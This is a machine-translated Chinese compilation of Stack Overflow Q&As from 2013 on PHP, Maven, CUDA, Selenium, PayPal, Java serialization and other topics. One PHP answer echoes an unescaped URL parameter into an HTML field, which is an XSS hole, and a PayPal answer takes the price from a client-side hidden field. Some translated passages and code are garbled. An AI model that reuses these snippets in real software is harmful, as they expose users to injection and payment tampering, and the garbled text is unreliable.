所以现在你可能会问自己，为什么我需要禁用内置的自动匹配代码？好吧，这就是答案。即使我们要在用户设置中阻止自动完成，使用类似的范围规则，它仍然会回退到默认值，因此无论我们在用户文件夹中做什么，都会插入自动配对引号。现在您可能会想，但是如果我们修改默认设置文件会怎样。虽然我们可以这样做，再次插入相同的上下文设置，但我们必须确保在任何后续更新中恢复该文件。所以我想这最终取决于你。如果您编辑默认文件，请记住，如果您需要恢复，则必须再次更改文件。

**崇高的文字3：**

在 ST3 中，您可以执行实际修改“默认”文件。这是由于在 ST3 中加载包的方式发生了变化。插件不需要解压缩到 Packages 文件夹，而是直接从 .sublime-package 文件（只是重命名的 zip）运行。此外，Packages 目录中的任何文件都优先于 .sublime-package 文件。因此，在 ST3 中，您将创建`Packages/Default/Default (your os here).sublime-keymap`并添加上下文行。任何后续更新都是安全的，因为更新不再修改 Packages 目录。

# html - 通过 URL 填写 HTML 字段

> ID：15845544
> 
> 赞同：0
> 
> 时间：2013-04-06T00:12:29.840
> 
> 标签：html, url

我有多个外部网站，每个页面都必须填写一个用户名。我试图通过将所有这些字段组合到一个用户名输入中来使一切变得更容易。输入用户名后单击提交按钮将在新选项卡中打开外部网站，每个选项卡都已填写用户名。我计划通过 URL 执行此操作。例如

```
 http://www.website.com/vote?username=inputted_username 
```

问题是这种方法不适用于 5 个外部网站中的 4 个。当我使用它时，网站会在没有填写该字段的情况下加载。有没有另一种方法可以做到这一点，而无需下载大量的 Javascript 库，如果有的话怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:34:31.170

如果你能够使用 PHP，你可以这样做：

```
<?php $username = $_GET['username']; ?>

 <input value="<?php echo $username; ?>"></input> 
```

它将从 URL 获取用户名并在回显处输出用户名

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:25:42.950

外部网站必须实现相应的代码以通过 URL 接受设置字段，如果不这样做，即使使用 javascript，您**也无法**做任何事情，因为访问外部域的元素被认为是安全问题，并且几乎所有网站都禁止浏览器。因此，您应该请求这些网站支持通过 URL 参数填写字段。

# actionscript-3 - 删除时间线中的影片剪辑 - 真的消失了吗？

> ID：15845547
> 
> 赞同：0
> 
> 时间：2013-04-06T00:13:06.057
> 
> 标签：actionscript-3

我想在一个物体撞到另一个物体时播放爆炸声。我这样做是为了当 hitTestObject 为真时，我运行这个函数

```
function createExplosion():void {
var explosion:Explosion = new Explosion(enemy.x, enemy.y);
this.parent.addChild(explosion);
} 
```

爆炸类仅包括将输入设置为其 x 和 y 值。然后在爆炸影片剪辑中，我有几帧动画。它以具有以下代码的关键帧（即，作为该帧中的动作）结束：

```
stop();
this.parent.removeChild(this); 
```

我的问题是。现在真的没了吗？我必须添加 stop() 才不会得到错误 1009。这让我怀疑某些事件计时器仍在运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:24:14.477

从显示列表中删除显示对象不会停止动画或将其从内存中删除。它只是将其从显示列表中删除。是的，您需要停止动画并删除可能对该对象处于活动状态的任何事件侦听器。

显示对象在被垃圾回收之前永远不会真正消失。但这不会发生，直到没有对该对象的引用仍然存在。因此，如果您有一个名为 explode 的变量引用您的显示对象，则需要在将其从显示列表中删除后将其设置为 null ：

```
explosion.stop();   // stop the animation
removeChild(explosion);  // remove from display list
explosion = null; // remove variable reference
// explosion now qualifies for garbage collection. 
```

请记住，这不会立即从内存中删除对象，它只是让垃圾收集器成为公平的游戏。您可以搜索“AS3 垃圾收集”以获取有关该过程的更多信息。

# maven - Maven执行单个附加测试

> ID：15845549
> 
> 赞同：2
> 
> 时间：2013-04-06T00:13:23.507
> 
> 标签：maven, testing

我对 maven 比较陌生，并且一直在为附加测试而苦苦挣扎，我在这里找到了一些文章，这些文章让我在其中取得了一些进展，但不能完全理解最后一点。这就是我想要做的。我有 2 个模块，其中一个定义了一组接口和这些接口的基本测试。第二个模块提供了接口的实现，我想在它上面运行预定义的测试。我把它归结为一个简单的例子，这里有两个项目：

```
interface
 + pom.xml
 + src
    + main
       + java
          + demo
             + Messenger.java
    + test
       + java
          + demo
             + MessengerTest.java

impl
 + pom.xml
 + src
    + main
       + java
          + demo
             + impl
                + MessengerImpl.java
    + test
       + resources
          + context.xml 
```

pom.xml 接口：

```
<project xmlns="http://maven.apache.org/POM/4.0.0"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-    4.0.0.xsd">
  <groupId>demo</groupId>
  <artifactId>interface</artifactId>
  <version>1.0</version>
  <modelVersion>4.0.0</modelVersion>
  <packaging>jar</packaging>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
    </dependency>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>3.2.2.RELEASE</version>
    </dependency>
  </dependencies>
  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-surefire-plugin</artifactId>
        <version>2.14</version>
        <configuration>
          <skipTests>true</skipTests>
        </configuration>
      </plugin>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-jar-plugin</artifactId>
        <version>2.2</version>
        <executions>
          <execution>
            <goals>
              <goal>test-jar</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project> 
```

Messenger.java 源代码：

```
package demo;

public interface Messenger {
    String getMessage();
} 
```

MessengerTest.java 源代码：

```
package demo;

import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

import org.junit.Before;
import org.junit.Test;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import demo.Messenger;

public class MessengerTest {
    private BeanFactory beanfactory;

    @Before
    public void setUp() throws Exception {
        beanfactory = new ClassPathXmlApplicationContext("context.xml");
    }

    @Test
    public final void testGetMessage() throws Exception {
        final Messenger msngr = beanfactory.getBean(Messenger.class);
        String msg = msngr.getMessage();
        assertNotNull(msg);
        assertTrue(msg.length() > 0);
    }
} 
```

执行“mvn install”似乎可以在我的本地存储库中创建 interface-1.0.jar 和 interface-1.0-tests.jar。

实现代码很简单，pom.xml：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>demo</groupId>
  <artifactId>impl</artifactId>
  <version>1.0</version>
  <modelVersion>4.0.0</modelVersion>
  <packaging>jar</packaging>

  <dependencies>
    <dependency>
      <groupId>demo</groupId>
      <artifactId>interface</artifactId>
      <version>1.0</version>
    </dependency>
    <dependency>
      <groupId>demo</groupId>
      <artifactId>interface</artifactId>
      <version>1.0</version>
      <type>test-jar</type>
      <scope>test</scope>
    </dependency>
  </dependencies>

</project> 
```

MessageImpl.java 源代码：

```
package demo.impl;

import demo.Messenger;

public class MessengerImpl implements Messenger {

    @Override
    public String getMessage() {
        return "Hello World";
    }
} 
```

最后，spring 上下文文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" 
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
       xmlns:aop="http://www.springframework.org/schema/aop"
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
       http://www.springframework.org/schema/beans/spring-beans-3.0.xsd">
  <bean id="MyMessenger" class="demo.impl.MessengerImpl"/>
</beans> 
```

完成所有这些后，我执行了“mvn -Dtest=demo.MessengerTest test”，不幸的是它失败了“......没有执行任何测试！”。所以有问题。

抱歉，啰嗦了这么多，但我想相当完整，任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T04:46:52.910

Surefire 在决定运行哪些类时不会扫描类路径，因此通常只考虑在同一模块中定义的测试。它签入`target/classes`项目`impl`，没有看到任何测试，并忽略`MessengerTest`. 您可以在项目中定义一个测试套件`impl`来引用要运行的测试，或者将依赖项解压缩到`target/classes`.

# google-chrome - Chrome 扩展从一页中抓取文本并显示内联加载

> ID：15845552
> 
> 赞同：1
> 
> 时间：2013-04-06T00:13:34.153
> 
> 标签：google-chrome, google-chrome-extension

所以我在开始这方面有点困难，因为我对 javascript 非常讨厌。我的目标是从页面上刮下一些文本（除了我想要的文本之外什么都没有），然后在我加载另一个页面时将其加载到浮动 div 或其他内容中。

在本质上：

timer.html 包含一个显示当前时间并每 10 秒自动重新加载的计时器。page.html 已加载，我想在 page.html 底部显示 timer.html

注意：我不拥有我的测试环境之外涉及的任何源，否则有一百万种更简单的方法可以做到这一点。

可以帮助我提供资源或代码示例吗？

# c++ - |= 在 C++ 中是什么意思？

> ID：15845554
> 
> 赞同：1
> 
> 时间：2013-04-06T00:13:39.157
> 
> 标签：c++, c

我试图理解 |= 在 c++ 中，我有示例代码

```
 int x = 0 ;

 x |= 3;
 std::cout<<x <<std::endl;

 x |= 6;
 std::cout<<x <<std::endl; 
```

输出是：

```
3
7 
```

这怎么可能，它与位加法有关吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-06T00:14:07.390

这是一个按位或和赋值。它与 x = x | 相同。3.

在二进制位中或等效于“如果任一数字为 1，则结果中为 1”。所以 x |= 3 等于 3。那么 x 在二进制中是 11，而 6 在二进制中是 110，所以 11 | 101 = 111（二进制）= 7（十进制）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-06T00:14:21.970

```
x |= 3 
```

方法

```
x = x |3 
```

按位或运算。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T00:18:19.383

它是按位的

> 或者

然后赋值。这意味着与 相同`x = x | 3`。 [关于按位或](http://en.wikipedia.org/wiki/Bitwise_operation#OR)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-06T00:20:18.753

它是按位或。

**第**一种情况：

```
0011(3 in decimal)
0000(0 in decimal) 
```

因此，两者的 OR 为：

```
0011 OR 0000 = 0011

= 2^0 + 2^1 
= 3 
```

对于**第二种**情况，OR 的工作方式如下：

```
0011 (3 in decimal) 
0110 (6 in decimal) 
```

OR的输出是0111，十进制是：

```
0011 OR 0110 = 0111

= 2^0 + 2^1 + 2^2 
= 1+2+4 
= 7 
```

# java - 在 Eclipse 中创建 android 项目后出错

> ID：15845562
> 
> 赞同：0
> 
> 时间：2013-04-06T00:14:57.797
> 
> 标签：java, android, sdk

每次我创建一个项目并添加一个 TextView 时，Eclipse 都会给我一个错误：

执行 aapt 的类型错误：返回代码 -1073741816 test3 第 1 行 Android ADT 问题。

尝试通过以下方式解决问题：删除SDK包，然后重新下载；清理了 C 驱动器（因为它也用于给出无法创建 res.bin 或类似的错误）；当我打开 MainActivity.java 文件时，加上说“R 无法解析为变量”。

任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:20:33.413

我建议您将您的项目（eclipse.exe 并重新安装 sdk）文件夹与 Eclipse 和 sdk 一起移动到一个新目录，因为旧目录总是会引用回可能包含错误的路径。一旦新目录没有错误，您就可以将 eclipse 引导到您的旧工作区。

# python - 使用 Selenium 和 python 通过部分 ID 选择元素？

> ID：15845563
> 
> 赞同：6
> 
> 时间：2013-04-06T00:15:00.907
> 
> 标签：python, selenium, getelementbyid

我正在尝试在 Python 2.7 中使用 Selenium 中的 Web 元素。元素 ID 是这样的：

```
cell.line.order(240686080).item(250444868).unitCost 
```

第一个数字字符串“240686080”是已知的，但第二个数字“250444868”事先是未知的。

我试图通过这样的方式达到它。

```
from selenium import webdriver
driver = webdriver.Firefox()
driver.get("somewebsite.com")
driver.find_elements_by_id('input.line.order(240417939).item('+ '\d{9}'+').unitCost') 
```

所以我的问题是，我们是否只能在已知部分 ID 的情况下搜索并访问该元素？

我发现下面回答了类似的问题，但它是在 C# 中。不幸的是，我不懂 C#。

[在 C# 中使用 Selenium 通过部分 id 查找元素](https://stackoverflow.com/questions/11961178/finding-an-element-by-partial-id-with-selenium-in-c-sharp)

先感谢您！

**已编辑 4/8**

元素编码如下：

```
<td id="cell.line.order(240417939).item(250159165).unitCost" class="or_monetarydata">
    <input id="input.line.order(240417939).item(250159165).unitCost" type="hidden" value="135.00" 
    name="order(240417939).item(250159165).unitcost"></input>

    135.00

    </td> 
```

我可以通过

```
value=driver.find_elements_by_xpath("//*[contains(@id, 'input.line.order(240417939)')]") 
```

谢谢！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-06T10:10:15.050

虽然答案在 C# 中，但底层解决方案仍然是相同的，通过使用 CSS 选择器：

```
driver.find_elements_by_css_selector('input[id*='cell.line.order(240686080)']') 
```

或者 XPath 也可以这样做：

```
driver.find_elements_by_xpath('//*[contains(@id, 'cell.line.order(240686080)')]') 
```

# highcharts - 如何在 highcharts 中说明角度数据系列？

> ID：15845564
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:02.300
> 
> 标签：highcharts, angle

我有一个数据集，其中系列值是以度为单位的角度（0 到 360）。是否可以在 highcharts 中绘制类似于[此处](http://i.imgur.com/OFyThZr.png)所示的图形（忽略绿色垂直线）？具体来说，如果满足以下任何条件，则图表应避免将两个数据点直接链接到穿过南方 (180) 的意义上，而应穿过北方 (0/360)：

1.  一个点低于 90，下一个点高于 270，或；
2.  一个点高于 270，下一个点低于 90。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T03:53:52.023

我要做的是简单地预处理您的数据以创建两个系列，然后将它们都绘制到同一个图上。一个系列用于 0-179，另一个系列用于 180-359。

您可能还需要考虑散点图而不是折线图，尤其是当您在任一系列中的数据不如示例中的数据平滑时。这意味着一个数据点是 10，下一个是 110，然后下一个是 12 或类似的数据。

此代码为您提供了一个示例，数据由 JSON 提供，但您应该能够轻松地将其替换为您的数据来源：

```
<script type="text/javascript">
$(document).ready(function () {
    var chart = new Highcharts.Chart({
        title: {
            text: 'Wind Direction'
        },
        chart: {
            renderTo: 'dataplot4',
            borderWidth: 1,
            defaultSeriesType: 'scatter',
            zoomType: 'x'
        },
        legend: {
            enabled: false
        },
        plotOptions: {
            series: {
                marker: {
                    radius: 3,
                    states: {
                        hover: {
                            enabled: true
                        }
                    }
                }
            }
        },
        xAxis: {
            type: 'datetime'
        },
        yAxis: {
            tickInterval: 90,
            min: 0,
            max: 360,
            title: {
                text: 'Wind Direction (deg)'
            }
        },
        tooltip: {
            crosshairs: true,
            formatter: function () {
                return '<b>' + Highcharts.dateFormat('%e. %b %Y, %H:00', this.x) + ' AKST</b> ' +
                        this.series.name + ': ' + this.y + ' deg';
            }
        },
        series: [
            {
                name: 'Wind Direction',
                data: JSON.parse("[" + wind_dir + "]"),
                pointStart: Number(startDateTime),
                pointInterval: 3600000
            }
        ]
    });
});
</script> 
```

我想我在某个地方有一个 jsfiddle，当我挖掘它时会更新答案。

编辑：这是一个显示散点图的小提琴。[http://jsfiddle.net/Reality_Extractor/pNFYL/](http://jsfiddle.net/Reality_Extractor/pNFYL/)

# cuda - 由于内核参数的启动原因，内核失败

> ID：15845566
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:09.550
> 
> 标签：cuda, malloc

我制作了一个简单的 CUDA 内核，但由于某种我不明白的原因无法启动。下面你会看到我的全局变量。

```
unsigned int volume[256*256*256];//contains volume data of source
unsigned int target[256*256*256];//contains volume data of target
unsigned int* d_volume=NULL;//source data on device
unsigned int* d_target=NULL;//target data on device 
```

下一个功能是内核启动器。

```
void launch_kernel(){

cudaMalloc(&d_volume,256*256*256*sizeof(unsigned int));
cudaMemcpy(d_volume, volume, 256*256*256*sizeof(unsigned int),cudaMemcpyHostToDevice);
cudaMalloc(&d_target,256*256*256*sizeof(unsigned int));
cudaMemcpy(d_target, target, 256*256*256*sizeof(unsigned int),cudaMemcpyHostToDevice);
dim3 threads(256,1,1);
dim3 blocks(256,256,1);

simple_kernel<<<blocks,threads>>>(d_volume,d_target);
cudaError_t cudaResult;
cudaResult = cudaGetLastError();
if (cudaResult != cudaSuccess)
{
    cout<<"kernel failed"<<endl;
}
cudaMemcpy(volume, d_volume, 256*256*256*sizeof( int),cudaMemcpyDeviceToHost);
cudaFree(d_volume);
cudaMemcpy(target, d_target 256*256*256*sizeof( int),cudaMemcpyDeviceToHost);
cudaFree(d_target);
} 
```

`d_target`如果我像这样启动内核，问题似乎是有原因的：

```
simple_kernel<<<blocks,threads>>>(d_volume,d_volume); 
```

它工作正常（将必须传递的值传递给设备）并且没有出现任何消​​息。知道为什么会这样吗？内核声明如下。

```
 __global__ void simple_kernel(unsigned int* src,unsigned int* tgt){
//i dont think it matters what it is for.
         int x = threadIdx.x;
         int y = blockIdx.x;
         int z = blockIdx.y;
         if(x!=0 || x!=255 || y!=0 || y!=255 || z!=0 || z!=255  ){//in bound of memory allocated
            if( src[x*256*256+y*256+z]==tgt[x*256*256+y*256+z])
                if(tgt[(x+1)*256*256+y*256+z]==1 || tgt[(x-1)*256*256+y*256+z]==1 || tgt[(x-1)*256*256+(y+1)*256+z] ||tgt[(x-1)*256*256+(y-1)*256+z])
                    src[x*256*256+y*256+z]=1;
                else
                    src[x*256*256+y*256+z]=0;
         }

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:55:27.267

在对全局内存的越界读取访问的情况下，CUDA 也可以返回错误。您执行此越界读取访问：
`if(tgt[(x+1)*256*256+y*256+z]==1 || ...)`例如，`x = y = z = 255`通过您的越界检查。

如果您在越界读取访问期间启动内核，
`simple_kernel<<<blocks,threads>>>(d_volume,d_volume);`
您实际上会访问已分配为`d_target`数组`d_volume`并`d_target`连续存储的全局内存，因此不会发生错误。

通过进一步的错误检查或使用 cuda-memcheck 启动您的程序来确认我的意见。

# php - 如何将贝宝与退货数据整合？

> ID：15845568
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:22.240
> 
> 标签：php, html, paypal

我在贝宝中创建了一个新的企业帐户并创建了一个按钮，但我遇到了这两个问题；1\. 当我通过服务价格时，用户点击（立即付款）按钮，然后用户转到贝宝页面，但我输入的价格并未显示为贝宝页面中的主要价格。贝宝中的商品价格为空。用户也必须将价格放入贝宝。而经过的价格在（Options: service price: 12）中不计入总金额。

这是我在页面中插入的按钮的代码：

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="3YNEZFSSJNVR4">
<table>
<tr><td><input type="hidden" name="on0" value="service price">service price</td></tr><tr><td><input type="text" name="os0" maxlength="200"></td></tr>
</table>
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_paynowCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1"> 
```

1.  第二个问题如何将交易信息传递到我的网站以将其记录在我的数据库中？是否需要与标准（免费）帐户不同的特殊帐户

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:43:15.103

看起来您没有将金额值传递给贝宝

```
<input type="hidden" name="amount" value="<?php echo $total; ?>"> 
```

# class - MooTools - 查找某个 div 类的 div id 的高度

> ID：15845571
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:43.740
> 
> 标签：class, html, mootools, offsetheight

我正在尝试使用 offsetHeight 根据其类查找元素的高度，到目前为止，我可以根据 div id 找到高度，但是如果我有多个类分配给同一个 id 怎么办？

我改编了这个 jsfiddle 来举例说明我在说什么：http: [//jsfiddle.net/VvrAs/80/](http://jsfiddle.net/VvrAs/80/)

```
var idheight = $('textarea').offsetHeight;
    var classheight1 = $$('.field').offsetHeight;
    var classheight2 = $$('.field2').offsetHeight; 
```

其中 field 和 field2 是 div 类，而 textarea 是一个 div id

我希望未定义的值根据类给出 div 的高度。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:22:18.953

选择器的`$$`行为很像`querySelectorAll`，因为它不会返回*单个*元素，而是`NodeList`包含*多个*元素，**即使只有一个元素与查询匹配**。

NodeLists 可以像数组一样被遍历，所以在你的情况下：

```
var classheight1 == $$('.field')[0].offsetHeight;
var classheight2 == $$('.field2')[0].offsetHeight; 
```

本质上，当您最初调用 时`$$('.field')`，您要求 MooTools 查找包含该类的元素的所有实例`field`。它返回了一个包含 1 项的 NodeList，但您仍需要通过其数组索引来引用它。

# java - 底层类结构改变后反序列化对象

> ID：15845572
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:54.163
> 
> 标签：java, serialization

我们正在序列化一些 Data 对象并将它们存储在数据库中，长期以来，数据库中有数百个这样的对象。最近我们需要改变其中一个类的结构。现在反序列化这些对象正在引发错误。

我们之前没有写自定义序列化和反序列化。这里的使用`defaultSerialVersionUID`也对我们没有帮助，因为它只是`1L`在序列化它们时的默认设置。

在底层的类结构改变后，有没有更好的方法来反序列化它们？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:47:48.600

> 我们正在序列化一些数据对象并将它们存储在数据库中......

那是/是一个大错误，IMO。您避免了必须构建和维护与数据对象相对应的表……但是 Java 对象序列化不是为这种事情而设计的，这种脆弱性是缺点之一。

* * *

@EJP 和 @sidoh 的答案提供了一些想法，可以让您摆脱当前的困境，前提是您可以掌握旧版本的课程。有几种方法：

*   回滚到破坏兼容性的更改之前的代码/模式状态......并以避免错误的方式重做工作。

*   不要回滚，而是编写一些临时转换器，将当前可读的对象加载为可读形式并更新存储的版本。

前者可能不切实际；例如，如果其他内容发生了太多变化，或者您的代码/数据正在生产中。

后者涉及从版本控制中检索类的旧版本和新版本，并构建一个临时转换器，该转换器加载旧类，转换为新类的实例并保存。这样做的困难在于构建一个可以在同一个 JVM 中*同时*使用相同类的两个不同版本的 Java 应用程序：

*   您可以在其类路径上实例化两个具有不同版本的类加载器。但问题是 JVM 会将这两组类视为*不同的类型*，这将使​​针对这两个版本的静态绑定变得不可能。您可以通过反射来处理这个问题……但它会非常混乱，特别是如果相应的对象 API 很广泛的话。

*   您可以将其作为一个两阶段的过程来完成。第 1 阶段是使用旧类加载，然后使用（比如说）您写入文件（比如说）的 JSON 序列化这些类。第 2 阶段是读取 JSON，使用它使用新类创建对象，并使用对象序列化对它们进行序列化。

* * *

*第三种选择是编写一个调整*序列化对象的临时转换器。基本上，您需要了解新旧序列化表单之间的差异，然后通过使用一些低级 API 读取/写入*序列化对象来重写序列化对象。*对此的一种变体是在新版本的类中实现自定义的 readObject 和方法，该类既能理解旧格式，也能理解新格式。但是，鉴于您的旧对象没有任何自定义版本字段，这可能会很棘手。需要注意的是，这种东西超出了序列化规范的范围......

* * *

但 IMO 最好的选择是以此为契机停止使用 Java 序列化。使用旧类读取对象，然后将它们写回数据库到常规 SQL 表中，作为 JSON 或 XML blob，或者使用 ORM 映射。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T00:19:23.347

展望未来，我强烈推荐[Thrift 之](http://thrift.apache.org/)类的东西。它的开发部分是为了解决这个问题。

至于解决手头的问题，您可以还原更改吗？反序列化对象，将旧数据中的字段放入新对象，并序列化新对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T00:30:17.200

*在进行这些更改之前*，您应该阅读的第一件事是对象序列化规范的对象版本控制章节。它准确地列出了在保持与现有序列化的兼容性的同时可以做什么和不能做什么。它允许的内容比大多数人想象的要多得多，但它不允许例如继承链中的更改，这听起来像是您所做的。

您必须做的第二件事是取消那些不符合要求的更改。

# android - 显示 AChartEngine 动态图的可点击嵌套 LinearLayout

> ID：15845573
> 
> 赞同：0
> 
> 时间：2013-04-06T00:15:56.600
> 
> 标签：android, android-linearlayout, achartengine, clickable

我遇到了一篇文章，其中解释说，如果我添加`android:onClick="OnClickMethod"`到`<LinearLayout>`XML 文件中，然后在 JAVA 文件中添加

```
 public void OnClickMethod(View v) {
    Intent intent= new Intent(getApplicationContext(), SecondActivity.class);
    startActivityForResult(intent, START_INTENT);
} 
```

它应该使 LinearLayout 可点击。它确实如此。但是，我的 XML 文件中有以下设置：

```
 <LinearLayout 
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_weight="1"
    android:padding="0dp"
    android:id="@+id/linearLayout1"
    >
    <LinearLayout
        android:layout_width="wrap_content"
        android:layout_height="fill_parent"
        android:layout_weight="1"
        android:padding="5dp"
        >
    <ImageView
        android:id="@+id/imageView1"
        android:src="@drawable/myIcon"
        android:gravity="center_vertical|center_horizontal"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_weight="2"
        />
    <TextView
        android:id="@+id/textView1"
        android:text="xxx"
        android:gravity="center_vertical|center_horizontal"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_weight="2"
        android:textStyle="bold"
        />
    </LinearLayout>
    <LinearLayout 
        android:id="@+id/myChart" 
        android:orientation="horizontal"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_weight="1" 
        />

</LinearLayout> 
```

如果我添加`android:OnClick="OnClickMethod"`到`linearLayout1`它只会使`TextView`和`Image`可点击。但理想情况下，我希望图表是可点击的。我尝试添加`android:OnClick="OnClickMethod"`到`myChart`LinearLayout，但它根本没有使该区域可点击。

顺便说一句，`myChart`LinearLayout 显示 AChartEngine 动态图。我禁用了 X 和 Y 平移，因此用户无法移动图形（`renderer.setPanEnabled(false, false)`

请向我解释我做错了什么？我希望情节是可点击的。我觉得我错过了什么。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:31:49.533

为了向图表添加点击交互，您必须启用点击交互并`OnClickListener`在图表视图上添加一个。[你可以在这个](http://code.google.com/p/achartengine/source/browse/trunk/achartengine/demo/org/achartengine/chartdemo/demo/chart/XYChartBuilder.java)例子中看到这个工作，第 156 行到第 176 行。

# python - django投票中的错误？

> ID：15845578
> 
> 赞同：1
> 
> 时间：2013-04-06T00:16:35.693
> 
> 标签：python, django, django-voting

我正在尝试检索 Django 中投票最多的项目。这是相关的代码行：

```
originalList = [x[0] for x in list(Vote.objects.get_top(Item, endIdx))[startIdx:]] 
```

索引用于分页目的。当我尝试在浏览器中加载页面时，我得到：

```
AttributeError at /items/top/
'Settings' object has no attribute 'DATABASE_ENGINE' 
```

但是，它应该寻找的属性不是 DATABASE_ENGINE，而是在`DATABASES['default']['ENGINE']`. 如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:42:19.470

是的，看起来那个代码已经有[4 年](https://code.google.com/p/django-voting/source/list)没有被碰过了。它声称

```
Note that this application requires Python 2.3 or later, and Django
0.97-pre or later. You can obtain Python from http://www.python.org/ and
Django from http://www.djangoproject.com/. 
```

当时，这很可能是定义数据库引擎的方式，现在已被弃用。就个人而言，我会避免使用它，它可能还有其他问题......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:12:45.870

这看起来像是 django1.0 之前的应用程序，您应该检查 github 上的分支：[https](https://github.com/brosner/django-voting/network) ://github.com/brosner/django-voting/network并使用活动分支或考虑为此使用替代应用程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:19:53.037

我已经完成了以下操作，我想这是在上游修复 django 投票之前最简单的事情：

在你的末尾`settings.py`，附加：

```
DATABASE_ENGINE = DATABASES['default']['ENGINE'] 
```

# java - 在java中对集合数组列表对象的集合进行排序

> ID：15845584
> 
> 赞同：0
> 
> 时间：2013-04-06T00:17:12.697
> 
> 标签：java, sorting, arraylist

```
 Class ParentClass 
    {
     private List<ChildClass>;
    }

    Class ChildClasss
    {

    private Date date;
    } 

    List<ParentClass> parentClassList; 
```

如何使用子类的 Date 属性对 parentClassList 对象进行排序？我可以为此使用比较器吗？

我对排序的要求是：我需要顶部的 parentClassObject 元素，该元素在子类对象中具有最早的日期。

例如：对象的 Json 表示法

```
{
     'parentElement1':{
        'childElement1':{
           'date' : '2013-04-05'
                        }
                     },
         'childElement2':{
           'date' : '2013-03-01'
                        }
                     }
                  },
'parentElement2':{
        'childElement1':{
           'date' : '2013-04-01'
                        }
                     },
         'childElement2':{
           'date' : '2013-03-04'
                        }
                     }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T03:40:40.203

首先，这种设计不适合您想要实现的目标。为什么父类需要来自子类的信息？这将导致您想要实现的目标的实现非常粗糙。

当您说要创建父类列表并根据子类值对其进行排序时，第一个问题是如何创建父类对象？

如果您将其创建为： ParentClass p = new ParentClass(); 那么您的代码将无法工作，因为没有子类实例，因此没有日期。

所以你所有的父类对象将被创建如下： ChildCLass c = new ChildClass(); 父类 p = (父类) p;

或者

ParentClass p = new ChildClass();

因此，您的解决方案将始终是粗糙且不可扩展的。

我建议改变设计。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:35:50.810

> 我可以为此使用比较器吗？

是的你可以。

确切地说，您将如何做到这一点尚不清楚……因为您的要求非常不清楚。但是，例如，`ParentClass`根据每个实例的*第一个* `ChildClass`实例的日期对实例列表进行排序会很简单`date`。

a 是否`Comparator`是正确的方法取决于上下文。`ParentClass`正如 Rajan 指出的那样：制作implement可能会更好`Comparable<ParentClass>`。

伪代码：

```
int compareTo(other)
    return -1, 0 or 1 depending on whether
         this.earliestChildDate() < other.earliestChild(),
         this.earliestChildDate() == other.earliestChild(), or
         this.earliestChildDate() > other.earliestChild()

Date earliestChildDate() 
    for each childElement in this.children
         date = smaller of date, childElement.date
    return date 
```

如果您缓存最早的子日期，那么排序会更快。

